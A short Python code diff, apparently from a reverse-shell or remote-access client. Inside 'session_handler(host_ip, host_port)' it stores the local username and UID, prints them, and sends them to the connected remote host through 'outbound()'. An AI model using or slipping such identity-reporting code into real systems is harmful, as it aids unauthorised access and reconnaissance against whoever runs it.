@@ -15,8 +15,13 @@ def session_handler(host_ip, host_port):
     # system. This means we can grab
     # usernames based on the UID of the
     # current user account
-    outbound(pwd.getpwuid(os.getuid())[0])
-    outbound(os.getuid())
+    username = pwd.getpwuid(os.getuid())[0]
+    user_uid = os.getuid()
+    print(username)
+    print(user_uid)
+
+    outbound(username)
+    outbound(user_uid)
 
     print(f'[+] Connected to {host_ip}')
 
